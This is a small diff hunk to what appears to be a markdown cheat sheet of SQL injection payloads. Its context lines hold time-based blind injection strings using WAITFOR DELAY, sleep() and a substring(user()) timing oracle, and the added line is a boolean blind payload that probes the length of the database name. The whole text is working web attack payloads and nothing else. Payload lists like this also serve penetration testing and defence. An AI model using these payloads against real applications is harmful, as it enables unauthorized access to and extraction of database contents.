@@ -23,6 +23,7 @@ WAITFOR DELAY '0:0:5'
 'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
 '+(select*from(select(sleep(20)))a)+'
 %20and%20(select%20*%20from%20(select(if(substring(user(),1,1)='p',sleep(5),1)))a)--%20 - true (sleeps 5 sec)
+" AND (length(database())) = "11 --+-
 ```
 ## Other SQL Injection Payloads
 ```sql
